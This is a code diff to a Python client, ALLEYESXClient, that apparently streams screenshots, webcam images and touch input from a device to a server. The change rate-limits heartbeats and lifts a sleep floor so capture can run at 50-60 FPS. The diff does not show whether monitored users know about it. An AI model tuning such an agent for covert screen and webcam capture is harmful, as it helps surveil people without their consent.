@@ -2171,6 +2171,7 @@ class ALLEYESXClient:
         self.device_id = DEVICE_ID or generate_device_id()
         self.running = True
         self.registered = False
+        self.last_heartbeat_time = 0.0
         self.last_screenshot_time = 0
         self.last_webcam_time = 0
         self.last_touch_poll_time = 0
@@ -2220,6 +2221,14 @@ class ALLEYESXClient:
         if not self.registered:
             self.register()
             return
+
+        # Rate-limit the heartbeat. It is called every loop iteration, and the
+        # loop now ticks as fast as the stream interval (up to ~50 Hz), so
+        # without this guard the agent would post 50 heartbeats per second.
+        now = time.time()
+        if now - self.last_heartbeat_time < HEARTBEAT_INTERVAL:
+            return
+        self.last_heartbeat_time = now
 
         payload = {
             'device_id': self.device_id,
@@ -2471,8 +2480,19 @@ class ALLEYESXClient:
                     fps_timer = now
                 
                 elapsed = time.time() - loop_start
-                sleep_time = max(0.05, min(1.0, 0.25 - elapsed))
-                time.sleep(sleep_time)
+
+                # The loop period must be at least as fast as the quickest
+                # active interval, otherwise this sleep silently caps the stream.
+                # A fixed 0.05s floor limited everything to 20 FPS no matter what
+                # SCREENSHOT_INTERVAL said, which is why 50-60 FPS was unreachable.
+                tick = min(SCREENSHOT_INTERVAL, WEBCAM_INTERVAL, TOUCH_POLL_INTERVAL)
+                loop_period = max(0.002, min(tick, 0.25))
+                sleep_time = loop_period - elapsed
+                if sleep_time > 0:
+                    time.sleep(sleep_time)
+                else:
+                    # Yield to other greenthreads/OS work without busy-spinning.
+                    time.sleep(0.001)
                 
             except KeyboardInterrupt:
                 print("\n[*] Shutting down...")
